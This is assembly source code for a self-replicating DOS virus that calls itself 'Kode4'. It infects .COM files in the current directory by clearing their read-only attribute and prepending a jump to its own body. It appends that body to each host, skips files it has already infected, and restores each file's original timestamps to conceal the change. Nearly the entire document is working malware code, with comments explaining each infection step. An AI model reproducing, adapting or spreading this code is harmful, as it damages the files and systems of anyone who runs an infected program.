seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h
V_Length        equ     vend-vstart
KODE4           proc    far       
start           label   near            
                db      0E9h,00h,00h
            
                
vstart          equ     $
                
                mov     si,100h                 ;get si to point to 100
                mov     di,102h                 ;get di to point to 102
lback:          inc     di                      ;increment di
                mov     ax,word ptr [si]        ;si is ponting to ax
                cmp     word ptr [di],ax        ;compare ax with di loc
                jne     lback                   ;INE go back and inc di
                                                

                mov     ax,word ptr [si+1]
                cmp     ax,word ptr [di+1]
                je      lout
                jmp     lback

lout:           add     di,3h                   ;jmp stored in the end
                sub     di,(v_length+100h)      ;+3 to get to end and -
                mov     si,di                   ;
;**********************************************************************
;*
;*  The above code can be re-written as follows...
;*  The above idea, although it works is very long in code....
;*  when DOS does a load and execute it pushes all registers the last
;*  register to be pushed contains the file length. so just subtract
;*  the current location
;**********************************************************************
;
;
;
;Host_Off:       pop     bp
;                sub     bp,offset host_off
;                mov     si,bp
;
;*** Before opening any file copy the original three bytes back to 100h
;*** Because they will get overwritten when you check any new files
                lea     di,temp_buff
                add     di,si
                mov     ax,word ptr [di]
                mov     cl,byte ptr [di+2]
                mov     di,100h
                mov     word ptr [di],ax
                mov     byte ptr [di+2],cl


                mov     ah,4Eh             ;Find first Com file
                mov     dx,offset filename  ; offset of "*.com"     
                add     dx,si
                int     21h                
                jnc     back
                jmp     done                         
Back:                                       
                mov     ah,43h              ;get rid of read only
                mov     al,0
                mov     dx,9eh
                int     21h
                mov     ah,43h
                mov     al,01
                and     cx,11111110b
                int     21h
                
                mov     ax,3D02h           ;Open file for read/writing
                mov     dx,9Eh             ;get file name from file DTA
                int     21h
                jnc     next                              
                jmp     done
next:           mov     bx,ax               ;save handle in bx
                mov     ah,57h              ;get time date
                mov     al,0
                int     21h
                
                push    cx                  ;put in stack for later
                push    dx

                mov     ax,4200h        ; Move ptr to start of file
                xor     cx,cx
                xor     dx,dx
                int     21h
                                
                
                mov     ah,3fh                ;load first 3 bytes
                mov     cx,3
                
                mov     dx,offset temp_buff 
                add     dx,si
                int     21h
        
                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax,4202h
                int     21h
                sub     ax,3                    ; Fix for real location
                push    ax
              ; nop                             ;
              ; nop                             ; used for debugging
              ; nop                             ;
              ; nop                             ;
              ; nop
                
                mov     di,offset temp_buff
                add     di,si
                mov     word ptr [j_code2+si],ax; Save two bytes in a 
                                                ; word [jumpin]

                cmp     byte ptr [di],0e9h  ;look for a jmp at begining
                jne     infect

                mov     cx,word ptr [di+1]  ;check for XXX bytes at end
                pop     ax
                sub     ax,v_length
                cmp     ax, cx              ; jump (id string to check)
                jne     infect
                jmp     finish



infect:      
                
                xor     cx,cx           ;move file pointer to begining 
                xor     dx,dx           ;to write jump
                mov     ax,4200h
                int     21h

                mov     ah,40h           ;write jump in first 3 bytes
                mov     cx,3
                mov     dx, offset j_code1
                add     dx,si
                int     21h

                xor     cx,cx       ;move file pointer to end of file
                xor     dx,dx
                mov     ax, 4202h
                int     21h

                mov     dx,offset vstart    
                add     dx,si            ;Start writing at top of virus
                mov     cx,(vend-vstart)   ; Set for length of virus
                mov     ah,40h             ;Write Data into the file
                int     21h                   


Finish:         pop     dx                 ;Restore old dates and times 
                pop     cx
                mov     ah,57h
                mov     al,01h
                int     21h

                mov     ah,3Eh             ;Close the file
                int     21h                   
                
                mov     ah,4Fh             ;Find Next file
                int     21h                    
                jc      done
                jmp     back
                
done:
                mov     bp,100h
                jmp     bp


filename        db      "*.com",0                     
DATA            db      " -=+ Kode4 +=-, The one and ONLY!$"

j_code1         db      0e9h 
j_code2         db      00h,00h
temp_buff       db      0cdh,020h,090h  ; CD 20 NOP
kode4           endp    

vend            equ     $

seg_a           ends

                end     start


